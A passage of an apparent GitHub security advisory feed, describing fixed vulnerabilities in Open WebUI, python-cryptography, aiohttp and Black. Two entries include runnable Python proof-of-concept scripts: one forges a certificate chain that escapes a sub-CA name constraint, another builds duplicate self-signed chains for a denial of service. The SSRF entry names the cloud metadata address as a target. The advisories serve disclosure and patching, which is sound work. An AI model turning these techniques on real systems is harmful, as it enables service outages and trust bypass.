<p>Reported with a script that runs end to end against a live instance. An administrator seeds the accounts and a standard channel granting read and write; everything after that is performed by a separate plain <code>user</code> account in no group that owns neither the channel nor any of the messages. That account edits a victim's message, attaches structured payloads to it, and deletes a second victim message, all returning 200, with the channel history dumped before and after. Controls in the same run confirm the scoping: a read-only member is refused with 403, and a cross-member edit on a group channel is refused with 403.</p>
<h2 id="credits">Credits</h2>
<p>@Foxer131 — reported the missing authorship check on the standard-channel update and delete handlers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-mj5r-jf49-m3w7">https://github.com/open-webui/open-webui/security/advisories/GHSA-mj5r-jf49-m3w7</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/27197">https://github.com/open-webui/open-webui/pull/27197</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/c609ec41154fa092fa0af80d9d365de06b666286">https://github.com/open-webui/open-webui/commit/c609ec41154fa092fa0af80d9d365de06b666286</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.0">https://github.com/open-webui/open-webui/releases/tag/v0.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-mj5r-jf49-m3w7">https://github.com/advisories/GHSA-mj5r-jf49-m3w7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mj5r-jf49-m3w7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T19:45:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: SSRF into internal services via unvalidated sub-resource requests in the Playwright web loader]]></title>
        <id>https://github.com/advisories/GHSA-w2rx-84hp-gg95</id>
        <link href="https://github.com/advisories/GHSA-w2rx-84hp-gg95"/>
        <updated>2026-08-04T19:40:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>With the Playwright web loader enabled, Open WebUI opens user-submitted URLs in a real browser and validates the destination address before allowing the request. That check only ran for the top-level page request. Every other request the page issued was passed through unvalidated, so a page could use its own JavaScript to reach addresses the validation exists to block. Because the loader returns the page's final DOM to the requesting user, anything the page read back from those addresses ends up in the web-search or RAG output.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li><code>WEB_LOADER_ENGINE=playwright</code>. This is not the default; deployments on the default web loader are unaffected.</li>
<li>A reachable Playwright browser, either local or via <code>PLAYWRIGHT_WS_URL</code>.</li>
<li>Any authenticated user who can submit a URL for ingestion or trigger a web search. No administrator role is required.</li>
<li>Something worth reading on a network the browser can reach. A deployment whose browser container has no route to internal services loses nothing here.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>An authenticated user can read HTTP responses from services reachable by the browser process: cloud instance metadata, other containers on the same network, and internal APIs bound to private addresses. The content is returned to the user through the normal web-search or document-ingestion result, so this is a read primitive, not a blind one. It confers no write access and no availability impact, and it does not extend beyond what the browser's network position already allows.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 0.11.0 by commit <code>bef63a2ae</code>. Every intercepted request is now validated, fetched with redirects disabled, re-validated on each redirect hop and then fulfilled, so neither a sub-resource nor a redirect can land on a non-global address. The same change blocks the two paths that never reached the interceptor at all: service-worker requests, via <code>service_workers="block"</code>, and WebSocket connections, via a route handler that never connects upstream. Upgrading to 0.11.0 fully resolves the issue; no configuration change is required.</p>
<h2 id="root-cause">Root cause</h2>
<p>Affected component: <code>SafePlaywrightURLLoader</code> in <code>backend/open_webui/retrieval/web/utils.py</code>, in both the sync and async request interceptors. Affected setup: only builds running the Playwright loader engine.</p>
<p>The interceptor was written to guard navigation, and its first action was to return early for any request whose resource type was not <code>document</code>. The intent was that only the page the user asked for needs address validation, but a browser page is not a single request: once the validated document loads, its scripts issue further requests under the page's own control, and those never reached the validation. The address check was therefore applied to the one request the attacker did not need to control, and skipped on every request they did.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Reported against 0.10.2 by driving the interceptor directly with stand-in route and request objects, one call per resource type, against <code>http://169.254.169.254/latest/meta-data/</code>. The <code>document</code> type is aborted; every other type is continued unvalidated. The browser and the network request were seeded rather than driven end to end; the code path exercised is the one the browser reaches for each sub-resource.</p>
<h2 id="credits">Credits</h2>
<ul>
<li><strong>@edwardav970</strong> — identified that address validation was applied only to the top-level document request, leaving every sub-resource type unvalidated.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-w2rx-84hp-gg95">https://github.com/open-webui/open-webui/security/advisories/GHSA-w2rx-84hp-gg95</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/27526">https://github.com/open-webui/open-webui/pull/27526</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/bef63a2ae915571d50d2722a635e8bfa753d7877">https://github.com/open-webui/open-webui/commit/bef63a2ae915571d50d2722a635e8bfa753d7877</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.0">https://github.com/open-webui/open-webui/releases/tag/v0.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-w2rx-84hp-gg95">https://github.com/advisories/GHSA-w2rx-84hp-gg95</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w2rx-84hp-gg95</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-04T19:40:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cryptography] python-cryptography verifier accepts wildcard DNS names allowing escape from permittedSubtrees]]></title>
        <id>https://github.com/advisories/GHSA-m2h6-j472-rp4c</id>
        <link href="https://github.com/advisories/GHSA-m2h6-j472-rp4c"/>
        <updated>2026-08-03T21:26:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If an intermediate constrained CA permits the DNS name <code>foo.example.com</code>, and the leaf certificate has a wildcard in its DNS SAN of <code>*.example.com</code>, python-cryptography's verifier accepts which allows escaping outside of the permitted names.</p>
<h3 id="poc">PoC</h3>
<pre><code>#!/usr/bin/env python3
"""Standalone PoC: pyca's DNSConstraint::matches admits a too-broad wildcard SAN.

Setup:
  Sub-CA permitted constraint: dNSName = foo.example.com
  Leaf SAN:                    dNSName = *.example.com
Expected: rejection (RFC 5280 §4.2.1.10 + standard wildcard semantics).
Observed: pyca accepts; further, asks server-verifier whether the leaf is
authoritative for `bar.example.com` and pyca answers yes — a sub-CA scope
escape.
"""
import datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.verification import (
    PolicyBuilder, Store, ExtensionPolicy, Criticality, VerificationError,
)

now = datetime.datetime(2027, 1, 1, tzinfo=datetime.timezone.utc)
day = datetime.timedelta(days=1)

def build(subject, issuer, key, issuer_key, ca, exts=()):
    b = (x509.CertificateBuilder()
         .subject_name(subject).issuer_name(issuer)
         .public_key(key.public_key())
         .serial_number(x509.random_serial_number())
         .not_valid_before(now - 30 * day)
         .not_valid_after(now + 3650 * day)
         .add_extension(x509.BasicConstraints(ca=ca, path_length=None), critical=True))
    for e, c in exts:
        b = b.add_extension(e, c)
    return b.sign(issuer_key, hashes.SHA256())

# Root
rk = ec.generate_private_key(ec.SECP256R1())
rn = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Test Root")])
root = build(rn, rn, rk, rk, True)

# Sub-CA constrained to foo.example.com
sk = ec.generate_private_key(ec.SECP256R1())
sn = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Sub-CA")])
nc = x509.NameConstraints(
    permitted_subtrees=[x509.DNSName("foo.example.com")],
    excluded_subtrees=None,
)
sub = build(sn, rn, sk, rk, True, [(nc, True)])

# Leaf with SAN *.example.com (over-broad relative to the constraint)
lk = ec.generate_private_key(ec.SECP256R1())
ln = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Leaf")])
san = x509.SubjectAlternativeName([x509.DNSName("*.example.com")])
leaf = build(ln, sn, lk, sk, False, [(san, False)])

# Policies
ca_pol = ExtensionPolicy.permit_all().require_present(
    x509.BasicConstraints, Criticality.AGNOSTIC, None,
)
ee_pol = ExtensionPolicy.permit_all().require_present(
    x509.SubjectAlternativeName, Criticality.AGNOSTIC, None,
)
v = (
    PolicyBuilder()
    .store(Store([root]))
    .time(now)
    .extension_policies(ca_policy=ca_pol, ee_policy=ee_pol)
    .build_server_verifier(x509.DNSName("bar.example.com"))
)
try:
    v.verify(leaf, [sub])
    print("BUG: pyca trusted leaf as bar.example.com though sub-CA was constrained to foo.example.com")
except VerificationError as e:
    print(f"EXPECTED: VerificationError: {e}")
</code></pre>
<h3 id="impact">Impact</h3>
<p>Acceptance of invalid certificate chain.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyca/cryptography/security/advisories/GHSA-m2h6-j472-rp4c">https://github.com/pyca/cryptography/security/advisories/GHSA-m2h6-j472-rp4c</a></li>
<li><a href="https://github.com/pyca/cryptography/pull/14888">https://github.com/pyca/cryptography/pull/14888</a></li>
<li><a href="https://github.com/pyca/cryptography/commit/4d035a4225965edeffd312079a510ef25fcfdcb2">https://github.com/pyca/cryptography/commit/4d035a4225965edeffd312079a510ef25fcfdcb2</a></li>
<li><a href="https://github.com/advisories/GHSA-m2h6-j472-rp4c">https://github.com/advisories/GHSA-m2h6-j472-rp4c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m2h6-j472-rp4c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T21:26:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cryptography] python-cryptography: Duplicate self-signed intermediates can cause exponential path-building]]></title>
        <id>https://github.com/advisories/GHSA-jwv3-5hgf-82ww</id>
        <link href="https://github.com/advisories/GHSA-jwv3-5hgf-82ww"/>
        <updated>2026-08-03T21:26:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When resolving invalid certificate chains that include duplicate copies of self-signed certificates, the processing recursively invokes the same candidate, leading to an exponential blowup. Although the limitation that the chain depth cannot exceed a specified maximum depth prevents unbounded recursion and guarantees termination, an attacker-controlled certificate chain can lead the processing to easily take more than 5s to reject in testing. This amplification could form the basis for a resource exhaustion denial of service attack.</p>
<p>This work was completed by Trail of Bits as part of the Patch The Planet project in collaboration with OpenAI. The finding was identified primarily by the Codex coding agent, and manually reviewed before submission. </p>
<h3 id="details">Details</h3>
<p>The core issue arises in the recursive nature of <code>build_chain_inner</code>, which does not de-duplicate against previously analyzed candidates.</p>
<pre><code class="language-python">    fn build_chain_inner(
        &amp;self,
        working_cert: &amp;VerificationCertificate&lt;'chain, B&gt;,
        current_depth: u8,
        working_cert_extensions: &amp;Extensions&lt;'chain&gt;,
        name_chain: NameChain&lt;'_, 'chain&gt;,
        budget: &amp;mut Budget,
    ) -&gt; ValidationResult&lt;'chain, Chain&lt;'chain, B&gt;, B&gt; {
        if let Some(nc) = working_cert_extensions.get_extension(&amp;NAME_CONSTRAINTS_OID) {
            name_chain.evaluate_constraints(&amp;nc.value()?, budget)?;
        }

        // Look in the store's root set to see if the working cert is listed.
        // If it is, we've reached the end.
        if self.store.contains(working_cert) {
            return Ok(vec![working_cert.clone()]);
        }

        // Check that our current depth does not exceed our policy-configured
        // max depth. We do this after the root set check, since the depth
        // only measures the intermediate chain's length, not the root or leaf.
        if current_depth &gt; self.policy.max_chain_depth {
            return Err(ValidationError::new(ValidationErrorKind::Other(
                "chain construction exceeds max depth".into(),
            )));
        }

        // Otherwise, we collect a list of potential issuers for this cert,
        // and continue with the first that verifies.
        let mut last_err: Option&lt;ValidationError&lt;'_, B&gt;&gt; = None;
        for issuing_cert_candidate in self.potential_issuers(working_cert) {
            // A candidate issuer is said to verify if it both
            // signs for the working certificate and conforms to the
            // policy.
            let issuer_extensions = issuing_cert_candidate.certificate().extensions()?;
            match self.policy.valid_issuer(
                issuing_cert_candidate,
                working_cert,
                current_depth,
                &amp;issuer_extensions,
            ) {
                Ok(_) =&gt; {
                    match self.build_chain_inner(
</code></pre>
<p>A sufficient patch is to track valid issuers, and to skip seen ones before recursing. By tracking valid issuers only, validation and custom extension-policy callbacks still run.</p>
<pre><code class="language-rust">          let mut seen_valid_issuers = Vec::&lt;&amp;VerificationCertificate&lt;'chain, B&gt;&gt;::new();
          for issuing_cert_candidate in self.potential_issuers(working_cert) {
          . . .
                  Ok(_) =&gt; {
                      if seen_valid_issuers.contains(&amp;issuing_cert_candidate) {
                         continue;
                      }
                      seen_valid_issuers.push(issuing_cert_candidate);
 
                      match self.build_chain_inner(
                          issuing_cert_candidate,
                          // NOTE(ww): According to RFC 5280, we should only
</code></pre>
<p>In testing, this fix removed the exponential blowup without breaking apparent correctness. </p>
<pre><code>duplicates,max_depth,result,seconds
1,7,rejected,0.000464 -&gt; 1,7,rejected,0.000667
2,7,rejected,0.025154 -&gt; 2,7,rejected,0.001229
3,7,rejected,0.489924 -&gt; 3,7,rejected,0.001619 
4,7,rejected,4.309403 -&gt; 4,7,rejected,0.002144
3,8,rejected,1.468193 -&gt; 3,8,rejected,0.001811
4,8,timeout&gt;5s,       -&gt; 4,8,rejected,0.002410
5,7,timeout&gt;5s,       -&gt; 5,7,rejected,0.002640
6,6,timeout&gt;5s,       -&gt; 6,6,rejected,0.002829
</code></pre>
<h3 id="poc">PoC</h3>
<p>The following script benchmarks processing times for malicious cert chains.</p>
<pre><code class="language-python">import datetime
import multiprocessing
import time

import cryptography
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
from cryptography.x509.verification import (
    DNSName,
    PolicyBuilder,
    Store,
    VerificationError,
)

NOW = datetime.datetime(2024, 1, 1, tzinfo=datetime.timezone.utc)
TIMEOUT = 5
CA_KEY_USAGE = x509.KeyUsage(
    digital_signature=True,
    content_commitment=False,
    key_encipherment=False,
    data_encipherment=False,
    key_agreement=False,
    key_cert_sign=True,
    crl_sign=True,
    encipher_only=False,
    decipher_only=False,
)
EE_KEY_USAGE = x509.KeyUsage(
    digital_signature=True,
    content_commitment=False,
    key_encipherment=False,
    data_encipherment=False,
    key_agreement=False,
    key_cert_sign=False,
    crl_sign=False,
    encipher_only=False,
    decipher_only=False,
)

def name(common_name):
    return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])

def base_builder(subject, issuer, public_key, serial):
    return (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(public_key)
        .serial_number(serial)
        .not_valid_before(NOW - datetime.timedelta(days=1))
        .not_valid_after(NOW + datetime.timedelta(days=30))
    )

def make_ca(common_name, serial):
    private_key = ec.generate_private_key(ec.SECP256R1())
    subject = name(common_name)
    cert = (
        base_builder(subject, subject, private_key.public_key(), serial)
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)
        .add_extension(CA_KEY_USAGE, True)
        .add_extension(
            x509.SubjectKeyIdentifier.from_public_key(private_key.public_key()),
            False,
        )
        .sign(private_key, hashes.SHA256())
    )
    return private_key, cert

def make_leaf(issuer_key, issuer_cert):
    private_key = ec.generate_private_key(ec.SECP256R1())
    return (
        base_builder(name("leaf"), issuer_cert.subject, private_key.public_key(), 100)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), True)
        .add_extension(EE_KEY_USAGE, True)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName("example.com")]), False)
        .add_extension(
            x509.AuthorityKeyIdentifier.from_issuer_public_key(issuer_key.public_key()),
            False,
        )
        .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), False)
        .sign(issuer_key, hashes.SHA256())
    )

def build_material():
    looping_key, looping_ca = make_ca("looping self-signed CA", 1)
    _, unrelated_root = make_ca("unrelated trust anchor", 2)
    leaf = make_leaf(looping_key, looping_ca)
    return leaf, looping_ca, unrelated_root

def verify_case(duplicates, max_depth, queue):
    leaf, looping_ca, unrelated_root = build_material()
    verifier = (
        PolicyBuilder()
        .store(Store([unrelated_root]))
        .time(NOW)
        .max_chain_depth(max_depth)
        .build_server_verifier(DNSName("example.com"))
    )

    start = time.perf_counter()
    try:
        verifier.verify(leaf, [looping_ca] * duplicates)
        result = "accepted"
    except VerificationError:
        result = "rejected"
    queue.put((result, time.perf_counter() - start))

def run_case(duplicates, max_depth):
    queue = multiprocessing.Queue()
    process = multiprocessing.Process(
        target=verify_case,
        args=(duplicates, max_depth, queue),
    )
    process.start()
    process.join(TIMEOUT)

    if process.is_alive():
        process.terminate()
        process.join()
        print(f"{duplicates},{max_depth},timeout&gt;{TIMEOUT}s,")
        return

    result, elapsed = queue.get()
    print(f"{duplicates},{max_depth},{result},{elapsed:.6f}")

if __name__ == "__main__":
    print("duplicates,max_depth,result,seconds")
    for case in [(1, 7), (2, 7), (3, 7), (4, 7), (3, 8), (4, 8), (5, 7), (6, 6)]:
        run_case(*case)
</code></pre>
<h3 id="impact">Impact</h3>
<p>This issue exposes an amplification pathway over data that in many applications may be user-controlled, leading to the possibility of a denial of service through resource exhaustion. As the correctness of validation is not affected, the integrity of a system cannot be compromised through this vector, only its availability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww">https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww</a></li>
<li><a href="https://github.com/pyca/cryptography/pull/14960">https://github.com/pyca/cryptography/pull/14960</a></li>
<li><a href="https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582">https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582</a></li>
<li><a href="https://github.com/advisories/GHSA-jwv3-5hgf-82ww">https://github.com/advisories/GHSA-jwv3-5hgf-82ww</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jwv3-5hgf-82ww</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T21:26:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cryptography] cryptography: PKCS#7 EnvelopedData decryption exposes a Bleichenbacher oracle through distinguishable errors and timing]]></title>
        <id>https://github.com/advisories/GHSA-g6cj-pr64-35w5</id>
        <link href="https://github.com/advisories/GHSA-g6cj-pr64-35w5"/>
        <updated>2026-08-03T21:18:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>pkcs7_decrypt_der</code>, <code>pkcs7_decrypt_pem</code>, and <code>pkcs7_decrypt_smime</code> reported the
outcome of decrypting a <code>RecipientInfo</code>'s <code>encryptedKey</code> in several
distinguishable ways, one of which disclosed the exact length recovered from the
RSA operation. The same distinction was also observable by timing. An
application that decrypts attacker-supplied <code>EnvelopedData</code> and reflects the
outcome gives the attacker a Bleichenbacher oracle against the
content-encryption key.</p>
<p>Introduced in 44.0.0. Fixed in 50.0.0.</p>
<h3 id="details">Details</h3>
<p>Decryption ran as: RSA PKCS#1 v1.5 decrypt of <code>encryptedKey</code> → build an AES
cipher from the result → AES-CBC decrypt and PKCS#7 unpad. Each stage failed
differently, with no RFC 3218 mitigation:</p>
<ol>
<li>invalid RSA padding → <code>Decryption failed</code></li>
<li>valid padding, bad key length → <code>Invalid key size (N) for AES.</code>, disclosing <code>N</code></li>
<li>correct length, wrong key → <code>Invalid padding bytes.</code></li>
<li>the real key → plaintext</li>
</ol>
<p>Case 1 is reachable only where the linked library lacks implicit rejection:
OpenSSL 3.0 and 3.1, LibreSSL, and BoringSSL. On OpenSSL 3.2+, used in our wheels,
invalid padding instead returns a synthetic plaintext of
pseudorandom length, so the error channel does not distinguish conforming
ciphertexts.</p>
<p>Exploitation requires a service that auto-decrypts untrusted <code>EnvelopedData</code>
matching the victim certificate and answers adaptively at high volume, such as
an S/MIME gateway or mail filter.</p>
<h3 id="fix">Fix</h3>
<p>Per RFC 3218, the content-encryption algorithm is now resolved before the
private key is used, so the expected key length is known in advance. If the RSA
decryption fails or recovers a key of the wrong length, a random key of the
expected length is substituted and decryption continues down an identical path.
All failures now report identically and perform the same work.</p>
<h3 id="not-addressed-by-this-fix">Not addressed by this fix</h3>
<p><code>EnvelopedData</code> does not authenticate its content. Tampering with
<code>encryptedContent</code> alone yields a CBC padding oracle that recovers plaintext at
roughly 256 queries per byte, without recovering any key, on every backend. This
is a property of PKCS#7 rather than of this implementation, cannot be fixed in
the library, and is now documented.</p>
<h3 id="credit">Credit</h3>
<p>Reported by @X1AOxiang.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyca/cryptography/security/advisories/GHSA-g6cj-pr64-35w5">https://github.com/pyca/cryptography/security/advisories/GHSA-g6cj-pr64-35w5</a></li>
<li><a href="https://github.com/pyca/cryptography/pull/15369">https://github.com/pyca/cryptography/pull/15369</a></li>
<li><a href="https://github.com/pyca/cryptography/commit/53fccd93413a8d7f07d6d8999681f27b75cffa3f">https://github.com/pyca/cryptography/commit/53fccd93413a8d7f07d6d8999681f27b75cffa3f</a></li>
<li><a href="https://github.com/advisories/GHSA-g6cj-pr64-35w5">https://github.com/advisories/GHSA-g6cj-pr64-35w5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g6cj-pr64-35w5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T21:17:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] AIOHTTP: Out-of-bounds heap read in C HTTP response parser error path (malformed chunked response)]]></title>
        <id>https://github.com/advisories/GHSA-cq5v-8q36-5273</id>
        <link href="https://github.com/advisories/GHSA-cq5v-8q36-5273"/>
        <updated>2026-08-03T20:51:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An out-of-bounds heap read could occur in the C response parser while building an error message for a malformed response.</p>
<h3 id="impact">Impact</h3>
<p>An attacker controlled server, or possibly an accidental response could trigger a DoS in the client.</p>
<h3 id="workaround">Workaround</h3>
<p>If unable to upgrade, the Python parser is unaffected and can be used with <code>AIOHTTP_NO_EXTENSIONS=1</code>.</p>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d">https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-cq5v-8q36-5273">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-cq5v-8q36-5273</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/13223">https://github.com/aio-libs/aiohttp/pull/13223</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d">https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.14.3">https://github.com/aio-libs/aiohttp/releases/tag/v3.14.3</a></li>
<li><a href="https://github.com/advisories/GHSA-cq5v-8q36-5273">https://github.com/advisories/GHSA-cq5v-8q36-5273</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cq5v-8q36-5273</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T20:51:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] AIOHTTP: HTTP request smuggling via WebSocket upgrade]]></title>
        <id>https://github.com/advisories/GHSA-mfx4-hv73-q22v</id>
        <link href="https://github.com/advisories/GHSA-mfx4-hv73-q22v"/>
        <updated>2026-08-03T20:47:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The HTTP parsers were vulnerable to a request smuggling attack relating to WebSocket upgrades.</p>
<h3 id="impact">Impact</h3>
<p>If using the server-side component, it may be possible for an attacker to execute a request smuggling vulnerability using an edge case in the WebSocket upgrade procedure. AIOHTT is unaware of any public exploit code.</p>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/6ae358f0983c3f4d6f67692b2f8e65dc8e091c98">https://github.com/aio-libs/aiohttp/commit/6ae358f0983c3f4d6f67692b2f8e65dc8e091c98</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mfx4-hv73-q22v">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mfx4-hv73-q22v</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/13017">https://github.com/aio-libs/aiohttp/pull/13017</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/6ae358f0983c3f4d6f67692b2f8e65dc8e091c98">https://github.com/aio-libs/aiohttp/commit/6ae358f0983c3f4d6f67692b2f8e65dc8e091c98</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.14.2">https://github.com/aio-libs/aiohttp/releases/tag/v3.14.2</a></li>
<li><a href="https://github.com/advisories/GHSA-mfx4-hv73-q22v">https://github.com/advisories/GHSA-mfx4-hv73-q22v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mfx4-hv73-q22v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T20:46:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] AIOHTTP: WebSocket client accepts compressed frames without negotiated permessage-deflate]]></title>
        <id>https://github.com/advisories/GHSA-mq44-7p77-q5h7</id>
        <link href="https://github.com/advisories/GHSA-mq44-7p77-q5h7"/>
        <updated>2026-08-03T20:40:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The client accepts and decompresses frames with the RSV1 bit set even when the <code>permessage-deflate</code> extension was not negotiated.</p>
<h3 id="impact">Impact</h3>
<p>A client may unexpectedly decompress WebSocket frames when explicitly opted out. This could lead to additional CPU/memory consumption, but is unlikely to be a significant issue unless a zip bomb vulnerability or similar is also present.</p>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/47fb6ae354d4fa22048f4dbe7dbf82b625f0a2f6">https://github.com/aio-libs/aiohttp/commit/47fb6ae354d4fa22048f4dbe7dbf82b625f0a2f6</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mq44-7p77-q5h7">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mq44-7p77-q5h7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59881">https://nvd.nist.gov/vuln/detail/CVE-2026-59881</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/12978">https://github.com/aio-libs/aiohttp/pull/12978</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/47fb6ae354d4fa22048f4dbe7dbf82b625f0a2f6">https://github.com/aio-libs/aiohttp/commit/47fb6ae354d4fa22048f4dbe7dbf82b625f0a2f6</a></li>
<li><a href="http://github.com/aio-libs/aiohttp/releases/tag/v3.14.2">http://github.com/aio-libs/aiohttp/releases/tag/v3.14.2</a></li>
<li><a href="https://github.com/advisories/GHSA-mq44-7p77-q5h7">https://github.com/advisories/GHSA-mq44-7p77-q5h7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq44-7p77-q5h7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T20:40:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[black] Black: Arbitrary file writes from unsanitized user input in cache file name]]></title>
        <id>https://github.com/advisories/GHSA-3936-cmfr-pm3m</id>
        <link href="https://github.com/advisories/GHSA-3936-cmfr-pm3m"/>
        <updated>2026-08-03T20:35:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Black writes a cache file, the name of which is computed from various formatting options. The value of the <code>--python-cell-magics</code> option was placed in the filename without sanitization, which allowed an attacker who controls the value of this argument to write cache files to arbitrary file system locations. </p>
<h3 id="patches">Patches</h3>
<p>Fixed in Black 26.3.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not allow untrusted user input into the value of the <code>--python-cell-magics</code> option.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/psf/black/security/advisories/GHSA-3936-cmfr-pm3m">https://github.com/psf/black/security/advisories/GHSA-3936-cmfr-pm3m</a></li>
<li><a href="https://github.com/psf/black/pull/5038">https://github.com/psf/black/pull/5038</a></li>
<li><a href="https://github.com/psf/black/commit/4937fe6cf241139ddbfc16b0bdbb5b422798909d">https://github.com/psf/black/commit/4937fe6cf241139ddbfc16b0bdbb5b422798909d</a></li>
<li><a href="https://github.com/psf/black/releases/tag/26.3.1">https://github.com/psf/black/releases/tag/26.3.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32274">https://nvd.nist.gov/vuln/detail/CVE-2026-32274</a></li>
<li><a href="https://github.com/psf/black/pull/4176">https://github.com/psf/black/pull/4176</a></li>
<li><a href="https://github.com/psf/black/commit/ed770ba4dd50c419148a0fca2b43937a7447e1f9">https://github.com/psf/black/commit/ed770ba4dd50c419148a0fca2b43937a7447e1f9</a></li>
